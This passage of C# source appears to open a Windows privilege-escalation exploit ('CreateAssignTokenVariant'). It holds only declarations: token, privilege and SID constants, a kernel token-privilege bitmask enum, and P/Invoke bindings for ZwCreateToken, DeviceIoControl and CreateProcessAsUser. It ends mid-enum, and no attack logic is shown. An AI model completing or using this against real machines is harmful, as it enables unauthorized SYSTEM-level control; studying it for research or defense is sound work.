using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Security.Principal;

namespace CreateAssignTokenVariant
{
    class CreateAssignTokenVariant
    {
        // Windows Definition
        // Windows Enum
        [Flags]
        enum FormatMessageFlags : uint
        {
            FORMAT_MESSAGE_ALLOCATE_BUFFER = 0x00000100,
            FORMAT_MESSAGE_IGNORE_INSERTS = 0x00000200,
            FORMAT_MESSAGE_FROM_STRING = 0x00000400,
            FORMAT_MESSAGE_FROM_HMODULE = 0x00000800,
            FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000,
            FORMAT_MESSAGE_ARGUMENT_ARRAY = 0x00002000
        }

        [Flags]
        enum ProcessCreationFlags : uint
        {
            DEBUG_PROCESS = 0x00000001,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            CREATE_SUSPENDED = 0x00000004,
            DETACHED_PROCESS = 0x00000008,
            CREATE_NEW_CONSOLE = 0x00000010,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            INHERIT_PARENT_AFFINITY = 0x00010000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NO_WINDOW = 0x08000000,
        }

        enum SECURITY_IMPERSONATION_LEVEL
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }

        [Flags]
        enum SE_GROUP_ATTRIBUTES : uint
        {
            SE_GROUP_MANDATORY = 0x00000001,
            SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002,
            SE_GROUP_ENABLED = 0x00000004,
            SE_GROUP_OWNER = 0x00000008,
            SE_GROUP_USE_FOR_DENY_ONLY = 0x00000010,
            SE_GROUP_INTEGRITY = 0x00000020,
            SE_GROUP_INTEGRITY_ENABLED = 0x00000040,
            SE_GROUP_RESOURCE = 0x20000000,
            SE_GROUP_LOGON_ID = 0xC0000000
        }

        [Flags]
        enum SE_PRIVILEGE_ATTRIBUTES : uint
        {
            SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001,
            SE_PRIVILEGE_ENABLED = 0x00000002,
            SE_PRIVILEGE_USED_FOR_ACCESS = 0x80000000,
        }

        enum SYSTEM_INFORMATION_CLASS
        {
            SystemBasicInformation = 0x00,
            SystemProcessorInformation = 0x01,
            SystemPerformanceInformation = 0x02,
            SystemTimeOfDayInformation = 0x03,
            SystemPathInformation = 0x04,
            SystemProcessInformation = 0x05,
            SystemCallCountInformation = 0x06,
            SystemDeviceInformation = 0x07,
            SystemProcessorPerformanceInformation = 0x08,
            SystemFlagsInformation = 0x09,
            SystemCallTimeInformation = 0x0A,
            SystemModuleInformation = 0x0B,
            SystemLocksInformation = 0x0C,
            SystemStackTraceInformation = 0x0D,
            SystemPagedPoolInformation = 0x0E,
            SystemNonPagedPoolInformation = 0x0F,
            SystemHandleInformation = 0x10,
            SystemObjectInformation = 0x11,
            SystemPageFileInformation = 0x12,
            SystemVdmInstemulInformation = 0x13,
            SystemVdmBopInformation = 0x14,
            SystemFileCacheInformation = 0x15,
            SystemPoolTagInformation = 0x16,
            SystemInterruptInformation = 0x17,
            SystemDpcBehaviorInformation = 0x18,
            SystemFullMemoryInformation = 0x19,
            SystemLoadGdiDriverInformation = 0x1A,
            SystemUnloadGdiDriverInformation = 0x1B,
            SystemTimeAdjustmentInformation = 0x1C,
            SystemSummaryMemoryInformation = 0x1D,
            SystemMirrorMemoryInformation = 0x1E,
            SystemPerformanceTraceInformation = 0x1F,
            SystemObsolete0 = 0x20,
            SystemExceptionInformation = 0x21,
            SystemCrashDumpStateInformation = 0x22,
            SystemKernelDebuggerInformation = 0x23,
            SystemContextSwitchInformation = 0x24,
            SystemRegistryQuotaInformation = 0x25,
            SystemExtendServiceTableInformation = 0x26,
            SystemPrioritySeperation = 0x27,
            SystemVerifierAddDriverInformation = 0x28,
            SystemVerifierRemoveDriverInformation = 0x29,
            SystemProcessorIdleInformation = 0x2A,
            SystemLegacyDriverInformation = 0x2B,
            SystemCurrentTimeZoneInformation = 0x2C,
            SystemLookasideInformation = 0x2D,
            SystemTimeSlipNotification = 0x2E,
            SystemSessionCreate = 0x2F,
            SystemSessionDetach = 0x30,
            SystemSessionInformation = 0x31,
            SystemRangeStartInformation = 0x32,
            SystemVerifierInformation = 0x33,
            SystemVerifierThunkExtend = 0x34,
            SystemSessionProcessInformation = 0x35,
            SystemLoadGdiDriverInSystemSpace = 0x36,
            SystemNumaProcessorMap = 0x37,
            SystemPrefetcherInformation = 0x38,
            SystemExtendedProcessInformation = 0x39,
            SystemRecommendedSharedDataAlignment = 0x3A,
            SystemComPlusPackage = 0x3B,
            SystemNumaAvailableMemory = 0x3C,
            SystemProcessorPowerInformation = 0x3D,
            SystemEmulationBasicInformation = 0x3E,
            SystemEmulationProcessorInformation = 0x3F,
            SystemExtendedHandleInformation = 0x40,
            SystemLostDelayedWriteInformation = 0x41,
            SystemBigPoolInformation = 0x42,
            SystemSessionPoolTagInformation = 0x43,
            SystemSessionMappedViewInformation = 0x44,
            SystemHotpatchInformation = 0x45,
            SystemObjectSecurityMode = 0x46,
            SystemWatchdogTimerHandler = 0x47,
            SystemWatchdogTimerInformation = 0x48,
            SystemLogicalProcessorInformation = 0x49,
            SystemWow64SharedInformationObsolete = 0x4A,
            SystemRegisterFirmwareTableInformationHandler = 0x4B,
            SystemFirmwareTableInformation = 0x4C,
            SystemModuleInformationEx = 0x4D,
            SystemVerifierTriageInformation = 0x4E,
            SystemSuperfetchInformation = 0x4F,
            SystemMemoryListInformation = 0x50,
            SystemFileCacheInformationEx = 0x51,
            SystemThreadPriorityClientIdInformation = 0x52,
            SystemProcessorIdleCycleTimeInformation = 0x53,
            SystemVerifierCancellationInformation = 0x54,
            SystemProcessorPowerInformationEx = 0x55,
            SystemRefTraceInformation = 0x56,
            SystemSpecialPoolInformation = 0x57,
            SystemProcessIdInformation = 0x58,
            SystemErrorPortInformation = 0x59,
            SystemBootEnvironmentInformation = 0x5A,
            SystemHypervisorInformation = 0x5B,
            SystemVerifierInformationEx = 0x5C,
            SystemTimeZoneInformation = 0x5D,
            SystemImageFileExecutionOptionsInformation = 0x5E,
            SystemCoverageInformation = 0x5F,
            SystemPrefetchPatchInformation = 0x60,
            SystemVerifierFaultsInformation = 0x61,
            SystemSystemPartitionInformation = 0x62,
            SystemSystemDiskInformation = 0x63,
            SystemProcessorPerformanceDistribution = 0x64,
            SystemNumaProximityNodeInformation = 0x65,
            SystemDynamicTimeZoneInformation = 0x66,
            SystemCodeIntegrityInformation = 0x67,
            SystemProcessorMicrocodeUpdateInformation = 0x68,
            SystemProcessorBrandString = 0x69,
            SystemVirtualAddressInformation = 0x6A,
            SystemLogicalProcessorAndGroupInformation = 0x6B,
            SystemProcessorCycleTimeInformation = 0x6C,
            SystemStoreInformation = 0x6D,
            SystemRegistryAppendString = 0x6E,
            SystemAitSamplingValue = 0x6F,
            SystemVhdBootInformation = 0x70,
            SystemCpuQuotaInformation = 0x71,
            SystemNativeBasicInformation = 0x72,
            SystemErrorPortTimeouts = 0x73,
            SystemLowPriorityIoInformation = 0x74,
            SystemBootEntropyInformation = 0x75,
            SystemVerifierCountersInformation = 0x76,
            SystemPagedPoolInformationEx = 0x77,
            SystemSystemPtesInformationEx = 0x78,
            SystemNodeDistanceInformation = 0x79,
            SystemAcpiAuditInformation = 0x7A,
            SystemBasicPerformanceInformation = 0x7B,
            SystemQueryPerformanceCounterInformation = 0x7C,
            SystemSessionBigPoolInformation = 0x7D,
            SystemBootGraphicsInformation = 0x7E,
            SystemScrubPhysicalMemoryInformation = 0x7F,
            SystemBadPageInformation = 0x80,
            SystemProcessorProfileControlArea = 0x81,
            SystemCombinePhysicalMemoryInformation = 0x82,
            SystemEntropyInterruptTimingInformation = 0x83,
            SystemConsoleInformation = 0x84,
            SystemPlatformBinaryInformation = 0x85,
            SystemPolicyInformation = 0x86,
            SystemHypervisorProcessorCountInformation = 0x87,
            SystemDeviceDataInformation = 0x88,
            SystemDeviceDataEnumerationInformation = 0x89,
            SystemMemoryTopologyInformation = 0x8A,
            SystemMemoryChannelInformation = 0x8B,
            SystemBootLogoInformation = 0x8C,
            SystemProcessorPerformanceInformationEx = 0x8D,
            SystemCriticalProcessErrorLogInformation = 0x8E,
            SystemSecureBootPolicyInformation = 0x8F,
            SystemPageFileInformationEx = 0x90,
            SystemSecureBootInformation = 0x91,
            SystemEntropyInterruptTimingRawInformation = 0x92,
            SystemPortableWorkspaceEfiLauncherInformation = 0x93,
            SystemFullProcessInformation = 0x94,
            SystemKernelDebuggerInformationEx = 0x95,
            SystemBootMetadataInformation = 0x96,
            SystemSoftRebootInformation = 0x97,
            SystemElamCertificateInformation = 0x98,
            SystemOfflineDumpConfigInformation = 0x99,
            SystemProcessorFeaturesInformation = 0x9A,
            SystemRegistryReconciliationInformation = 0x9B,
            SystemEdidInformation = 0x9C,
            SystemManufacturingInformation = 0x9D,
            SystemEnergyEstimationConfigInformation = 0x9E,
            SystemHypervisorDetailInformation = 0x9F,
            SystemProcessorCycleStatsInformation = 0xA0,
            SystemVmGenerationCountInformation = 0xA1,
            SystemTrustedPlatformModuleInformation = 0xA2,
            SystemKernelDebuggerFlags = 0xA3,
            SystemCodeIntegrityPolicyInformation = 0xA4,
            SystemIsolatedUserModeInformation = 0xA5,
            SystemHardwareSecurityTestInterfaceResultsInformation = 0xA6,
            SystemSingleModuleInformation = 0xA7,
            SystemAllowedCpuSetsInformation = 0xA8,
            SystemDmaProtectionInformation = 0xA9,
            SystemInterruptCpuSetsInformation = 0xAA,
            SystemSecureBootPolicyFullInformation = 0xAB,
            SystemCodeIntegrityPolicyFullInformation = 0xAC,
            SystemAffinitizedInterruptProcessorInformation = 0xAD,
            SystemRootSiloInformation = 0xAE,
            SystemCpuSetInformation = 0xAF,
            SystemCpuSetTagInformation = 0xB0,
            SystemWin32WerStartCallout = 0xB1,
            SystemSecureKernelProfileInformation = 0xB2,
            SystemCodeIntegrityPlatformManifestInformation = 0xB3,
            SystemInterruptSteeringInformation = 0xB4,
            SystemSuppportedProcessorArchitectures = 0xB5,
            SystemMemoryUsageInformation = 0xB6,
            SystemCodeIntegrityCertificateInformation = 0xB7,
            SystemPhysicalMemoryInformation = 0xB8,
            SystemControlFlowTransition = 0xB9,
            SystemKernelDebuggingAllowed = 0xBA,
            SystemActivityModerationExeState = 0xBB,
            SystemActivityModerationUserSettings = 0xBC,
            SystemCodeIntegrityPoliciesFullInformation = 0xBD,
            SystemCodeIntegrityUnlockInformation = 0xBE,
            SystemIntegrityQuotaInformation = 0xBF,
            SystemFlushInformation = 0xC0,
            SystemProcessorIdleMaskInformation = 0xC1,
            SystemSecureDumpEncryptionInformation = 0xC2,
            SystemWriteConstraintInformation = 0xC3,
            SystemKernelVaShadowInformation = 0xC4,
            SystemHypervisorSharedPageInformation = 0xC5,
            SystemFirmwareBootPerformanceInformation = 0xC6,
            SystemCodeIntegrityVerificationInformation = 0xC7,
            SystemFirmwarePartitionInformation = 0xC8,
            SystemSpeculationControlInformation = 0xC9,
            SystemDmaGuardPolicyInformation = 0xCA,
            SystemEnclaveLaunchControlInformation = 0xCB,
            SystemWorkloadAllowedCpuSetsInformation = 0xCC,
            SystemCodeIntegrityUnlockModeInformation = 0xCD,
            SystemLeapSecondInformation = 0xCE,
            SystemFlags2Information = 0xCF,
            SystemSecurityModelInformation = 0xD0,
            SystemCodeIntegritySyntheticCacheInformation = 0xD1,
            MaxSystemInfoClass = 0xD2
        }

        [Flags]
        enum TokenAccessFlags : uint
        {
            TOKEN_ADJUST_DEFAULT = 0x0080,
            TOKEN_ADJUST_GROUPS = 0x0040,
            TOKEN_ADJUST_PRIVILEGES = 0x0020,
            TOKEN_ADJUST_SESSIONID = 0x0100,
            TOKEN_ASSIGN_PRIMARY = 0x0001,
            TOKEN_DUPLICATE = 0x0002,
            TOKEN_EXECUTE = 0x00020000,
            TOKEN_IMPERSONATE = 0x0004,
            TOKEN_QUERY = 0x0008,
            TOKEN_QUERY_SOURCE = 0x0010,
            TOKEN_READ = 0x00020008,
            TOKEN_WRITE = 0x000200E0,
            TOKEN_ALL_ACCESS = 0x000F01FF,
            MAXIMUM_ALLOWED = 0x02000000
        }

        enum TOKEN_INFORMATION_CLASS
        {
            TokenUser = 1,
            TokenGroups,
            TokenPrivileges,
            TokenOwner,
            TokenPrimaryGroup,
            TokenDefaultDacl,
            TokenSource,
            TokenType,
            TokenImpersonationLevel,
            TokenStatistics,
            TokenRestrictedSids,
            TokenSessionId,
            TokenGroupsAndPrivileges,
            TokenSessionReference,
            TokenSandBoxInert,
            TokenAuditPolicy,
            TokenOrigin,
            TokenElevationType,
            TokenLinkedToken,
            TokenElevation,
            TokenHasRestrictions,
            TokenAccessInformation,
            TokenVirtualizationAllowed,
            TokenVirtualizationEnabled,
            TokenIntegrityLevel,
            TokenUIAccess,
            TokenMandatoryPolicy,
            TokenLogonSid,
            MaxTokenInfoClass
        }

        enum TOKEN_TYPE
        {
            TokenPrimary = 1,
            TokenImpersonation
        }

        // Windows Struct
        [StructLayout(LayoutKind.Explicit, Size = 8)]
        struct LARGE_INTEGER
        {
            [FieldOffset(0)]
            public int Low;
            [FieldOffset(4)]
            public int High;
            [FieldOffset(0)]
            public long QuadPart;

            public LARGE_INTEGER(int _low, int _high)
            {
                QuadPart = 0L;
                Low = _low;
                High = _high;
            }

            public LARGE_INTEGER(long _quad)
            {
                Low = 0;
                High = 0;
                QuadPart = _quad;
            }

            public long ToInt64()
            {
                return ((long)this.High << 32) | (uint)this.Low;
            }

            public static LARGE_INTEGER FromInt64(long value)
            {
                return new LARGE_INTEGER
                {
                    Low = (int)(value),
                    High = (int)((value >> 32))
                };
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct LUID
        {
            public uint LowPart;
            public uint HighPart;

            public LUID(uint _lowPart, uint _highPart)
            {
                LowPart = _lowPart;
                HighPart = _highPart;
            }
        }

        [StructLayout(LayoutKind.Sequential, Pack = 4)]
        struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct OBJECT_ATTRIBUTES : IDisposable
        {
            public int Length;
            public IntPtr RootDirectory;
            private IntPtr objectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;

            public OBJECT_ATTRIBUTES(string name, uint attrs)
            {
                Length = 0;
                RootDirectory = IntPtr.Zero;
                objectName = IntPtr.Zero;
                Attributes = attrs;
                SecurityDescriptor = IntPtr.Zero;
                SecurityQualityOfService = IntPtr.Zero;

                Length = Marshal.SizeOf(this);
                ObjectName = new UNICODE_STRING(name);
            }

            public UNICODE_STRING ObjectName
            {
                get
                {
                    return (UNICODE_STRING)Marshal.PtrToStructure(
                        objectName, typeof(UNICODE_STRING));
                }

                set
                {
                    bool fDeleteOld = objectName != IntPtr.Zero;
                    if (!fDeleteOld)
                        objectName = Marshal.AllocHGlobal(Marshal.SizeOf(value));
                    Marshal.StructureToPtr(value, objectName, fDeleteOld);
                }
            }

            public void Dispose()
            {
                if (objectName != IntPtr.Zero)
                {
                    Marshal.DestroyStructure(objectName, typeof(UNICODE_STRING));
                    Marshal.FreeHGlobal(objectName);
                    objectName = IntPtr.Zero;
                }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SECURITY_QUALITY_OF_SERVICE
        {
            readonly int Length;
            readonly SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
            readonly byte ContextTrackingMode;
            readonly byte EffectiveOnly;

            public SECURITY_QUALITY_OF_SERVICE(
                SECURITY_IMPERSONATION_LEVEL _impersonationLevel,
                byte _contextTrackingMode,
                byte _effectiveOnly)
            {
                Length = 0;
                ImpersonationLevel = _impersonationLevel;
                ContextTrackingMode = _contextTrackingMode;
                EffectiveOnly = _effectiveOnly;

                Length = Marshal.SizeOf(this);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid; // PSID
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SID_IDENTIFIER_AUTHORITY
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]
            public byte[] Value;

            public SID_IDENTIFIER_AUTHORITY(byte[] value)
            {
                Value = value;
            }
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
        {
            public IntPtr Object;
            public IntPtr UniqueProcessId;
            public IntPtr HandleValue;
            public int GrantedAccess;
            public short CreatorBackTraceIndex;
            public short ObjectTypeIndex;
            public int HandleAttributes;
            public int Reserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_DEFAULT_DACL
        {
            public IntPtr DefaultDacl; // PACL
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_GROUPS
        {
            public int GroupCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 32)]
            public SID_AND_ATTRIBUTES[] Groups;

            public TOKEN_GROUPS(int privilegeCount)
            {
                GroupCount = privilegeCount;
                Groups = new SID_AND_ATTRIBUTES[32];
            }
        };

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_PRIVILEGES
        {
            public int PrivilegeCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
            public LUID_AND_ATTRIBUTES[] Privileges;

            public TOKEN_PRIVILEGES(int privilegeCount)
            {
                PrivilegeCount = privilegeCount;
                Privileges = new LUID_AND_ATTRIBUTES[36];
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_OWNER
        {
            public IntPtr Owner; // PSID

            public TOKEN_OWNER(IntPtr _owner)
            {
                Owner = _owner;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_PRIMARY_GROUP
        {
            public IntPtr PrimaryGroup; // PSID

            public TOKEN_PRIMARY_GROUP(IntPtr _sid)
            {
                PrimaryGroup = _sid;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_SOURCE
        {
            public TOKEN_SOURCE(string name)
            {
                SourceName = new byte[8];
                Encoding.GetEncoding(1252).GetBytes(name, 0, name.Length, SourceName, 0);
                if (!AllocateLocallyUniqueId(out SourceIdentifier))
                    throw new System.ComponentModel.Win32Exception();
            }

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] SourceName;
            public LUID SourceIdentifier;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;

            public TOKEN_USER(IntPtr _sid)
            {
                User = new SID_AND_ATTRIBUTES
                {
                    Sid = _sid,
                    Attributes = 0
                };
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct UNICODE_STRING : IDisposable
        {
            public ushort Length;
            public ushort MaximumLength;
            private IntPtr buffer;

            public UNICODE_STRING(string s)
            {
                Length = (ushort)(s.Length * 2);
                MaximumLength = (ushort)(Length + 2);
                buffer = Marshal.StringToHGlobalUni(s);
            }

            public void Dispose()
            {
                Marshal.FreeHGlobal(buffer);
                buffer = IntPtr.Zero;
            }

            public override string ToString()
            {
                return Marshal.PtrToStringUni(buffer);
            }
        }

        // Windows API
        /*
         * advapi32.dll
         */
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool AllocateLocallyUniqueId(out LUID Luid);

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSid, out string strSid);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertStringSidToSid(string StringSid, out IntPtr pSid);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcessAsUser(
            IntPtr hToken,
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            ProcessCreationFlags dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(
            IntPtr TokenHandle,
            TOKEN_INFORMATION_CLASS TokenInformationClass,
            IntPtr TokenInformation,
            int TokenInformationLength,
            out int ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool LookupPrivilegeValue(
            string lpSystemName,
            string lpName,
            out LUID lpLuid);

        /*
         * kernel32.dll
         */
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr CreateFile(
            string lpFileName,
            FileAccess dwDesiredAccess,
            FileShare dwShareMode,
            IntPtr lpSecurityAttributes,
            FileMode dwCreationDisposition,
            FileAttributes dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool DeviceIoControl(
            IntPtr hDevice,
            uint dwIoControlCode,
            IntPtr InBuffer,
            int nInBufferSize,
            IntPtr OutBuffer,
            int nOutBufferSize,
            IntPtr pBytesReturned,
            IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern uint FormatMessage(
            FormatMessageFlags dwFlags,
            IntPtr lpSource,
            int dwMessageId,
            int dwLanguageId,
            StringBuilder lpBuffer,
            int nSize,
            IntPtr Arguments);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool FreeLibrary(IntPtr hLibModule);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LocalFree(IntPtr hMem);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);

        /*
         * ntdll.dll
         */
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtQuerySystemInformation(
            SYSTEM_INFORMATION_CLASS SystemInformationClass,
            IntPtr SystemInformation,
            int SystemInformationLength,
            ref int ReturnLength);

        [DllImport("ntdll.dll")]
        static extern uint ZwCreateToken(
            out IntPtr TokenHandle,
            TokenAccessFlags DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            TOKEN_TYPE TokenType,
            ref LUID AuthenticationId,
            ref LARGE_INTEGER ExpirationTime,
            ref TOKEN_USER TokenUser,
            ref TOKEN_GROUPS TokenGroups,
            ref TOKEN_PRIVILEGES TokenPrivileges,
            ref TOKEN_OWNER TokenOwner,
            ref TOKEN_PRIMARY_GROUP TokenPrimaryGroup,
            ref TOKEN_DEFAULT_DACL TokenDefaultDacl,
            ref TOKEN_SOURCE TokenSource);

        // Windows Consts
        const uint STATUS_SUCCESS = 0;
        const uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;
        const int ERROR_BAD_LENGTH = 0x00000018;
        const int ERROR_INSUFFICIENT_BUFFER = 0x0000007A;
        static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
        const string DOMAIN_ALIAS_RID_ADMINS = "S-1-5-32-544";
        const string TRUSTED_INSTALLER_RID = "S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464";
        const string UNTRUSTED_MANDATORY_LEVEL = "S-1-16-0";
        const string LOW_MANDATORY_LEVEL = "S-1-16-4096";
        const string MEDIUM_MANDATORY_LEVEL = "S-1-16-8192";
        const string MEDIUM_PLUS_MANDATORY_LEVEL = "S-1-16-8448";
        const string HIGH_MANDATORY_LEVEL = "S-1-16-12288";
        const string SYSTEM_MANDATORY_LEVEL = "S-1-16-16384";
        const string LOCAL_SYSTEM_RID = "S-1-5-18";
        const string SE_CREATE_TOKEN_NAME = "SeCreateTokenPrivilege";
        const string SE_ASSIGNPRIMARYTOKEN_NAME = "SeAssignPrimaryTokenPrivilege";
        const string SE_LOCK_MEMORY_NAME = "SeLockMemoryPrivilege";
        const string SE_INCREASE_QUOTA_NAME = "SeIncreaseQuotaPrivilege";
        const string SE_MACHINE_ACCOUNT_NAME = "SeMachineAccountPrivilege";
        const string SE_TCB_NAME = "SeTcbPrivilege";
        const string SE_SECURITY_NAME = "SeSecurityPrivilege";
        const string SE_TAKE_OWNERSHIP_NAME = "SeTakeOwnershipPrivilege";
        const string SE_LOAD_DRIVER_NAME = "SeLoadDriverPrivilege";
        const string SE_SYSTEM_PROFILE_NAME = "SeSystemProfilePrivilege";
        const string SE_SYSTEMTIME_NAME = "SeSystemtimePrivilege";
        const string SE_PROFILE_SINGLE_PROCESS_NAME = "SeProfileSingleProcessPrivilege";
        const string SE_INCREASE_BASE_PRIORITY_NAME = "SeIncreaseBasePriorityPrivilege";
        const string SE_CREATE_PAGEFILE_NAME = "SeCreatePagefilePrivilege";
        const string SE_CREATE_PERMANENT_NAME = "SeCreatePermanentPrivilege";
        const string SE_BACKUP_NAME = "SeBackupPrivilege";
        const string SE_RESTORE_NAME = "SeRestorePrivilege";
        const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";
        const string SE_DEBUG_NAME = "SeDebugPrivilege";
        const string SE_AUDIT_NAME = "SeAuditPrivilege";
        const string SE_SYSTEM_ENVIRONMENT_NAME = "SeSystemEnvironmentPrivilege";
        const string SE_CHANGE_NOTIFY_NAME = "SeChangeNotifyPrivilege";
        const string SE_REMOTE_SHUTDOWN_NAME = "SeRemoteShutdownPrivilege";
        const string SE_UNDOCK_NAME = "SeUndockPrivilege";
        const string SE_SYNC_AGENT_NAME = "SeSyncAgentPrivilege";
        const string SE_ENABLE_DELEGATION_NAME = "SeEnableDelegationPrivilege";
        const string SE_MANAGE_VOLUME_NAME = "SeManageVolumePrivilege";
        const string SE_IMPERSONATE_NAME = "SeImpersonatePrivilege";
        const string SE_CREATE_GLOBAL_NAME = "SeCreateGlobalPrivilege";
        const string SE_TRUSTED_CREDMAN_ACCESS_NAME = "SeTrustedCredManAccessPrivilege";
        const string SE_RELABEL_NAME = "SeRelabelPrivilege";
        const string SE_INCREASE_WORKING_SET_NAME = "SeIncreaseWorkingSetPrivilege";
        const string SE_TIME_ZONE_NAME = "SeTimeZonePrivilege";
        const string SE_CREATE_SYMBOLIC_LINK_NAME = "SeCreateSymbolicLinkPrivilege";
        const string SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME = "SeDelegateSessionUserImpersonatePrivilege";
        const byte SECURITY_STATIC_TRACKING = 0;
        static readonly LUID SYSTEM_LUID = new LUID(0x3e7, 0);

        // User define Consts
        [Flags]
        enum SepTokenPrivilegesFlags : ulong
        {
            CREATE_TOKEN = 0x0000000000000004UL, // SeCreateTokenPrivilege
            ASSIGNPRIMARYTOKEN = 0x0000000000000008UL, // SeAssignPrimaryTokenPrivilege
            LOCK_MEMORY = 0x0000000000000010UL, // SeLockMemoryPrivilege
            INCREASE_QUOTA = 0x0000000000000020UL, // SeIncreaseQuotaPrivilege
            MACHINE_ACCOUNT = 0x0000000000000040UL, // SeMachineAccountPrivilege
            TCB = 0x0000000000000080UL, // SeTcbPrivilege
            SECURITY = 0x0000000000000100UL, // SeSecurityPrivilege
            TAKE_OWNERSHIP = 0x0000000000000200UL, // SeTakeOwnershipPrivilege
            LOAD_DRIVER = 0x0000000000000400UL, // SeLoadDriverPrivilege
            SYSTEM_PROFILE = 0x0000000000000800UL, // SeSystemProfilePrivilege
            SYSTEMTIME = 0x0000000000001000UL, // SeSystemtimePrivilege
            PROFILE_SINGLE_PROCESS = 0x0000000000002000UL, // SeProfileSingleProcessPrivilege
            INCREASE_BASE_PRIORITY = 0x0000000000004000UL, // SeIncreaseBasePriorityPrivilege
            CREATE_PAGEFILE = 0x0000000000008000UL, // SeCreatePagefilePrivilege
            CREATE_PERMANENT = 0x0000000000010000UL, // SeCreatePermanentPrivilege
            BACKUP = 0x0000000000020000UL, // SeBackupPrivilege
            RESTORE = 0x0000000000040000UL, // SeRestorePrivilege
            SHUTDOWN = 0x0000000000080000UL, // SeShutdownPrivilege
            DEBUG = 0x0000000000100000UL, // SeDebugPrivilege
            AUDIT = 0x0000000000200000UL, // SeAuditPrivilege
            SYSTEM_ENVIRONMENT = 0x0000000000400000UL, // SeSystemEnvironmentPrivilege
            CHANGE_NOTIFY = 0x0000000000800000UL, // SeChangeNotifyPrivilege
            REMOTE_SHUTDOWN = 0x0000000001000000UL, // SeRemoteShutdownPrivilege
            UNDOCK = 0x0000000002000000UL, // SeUndockPrivilege
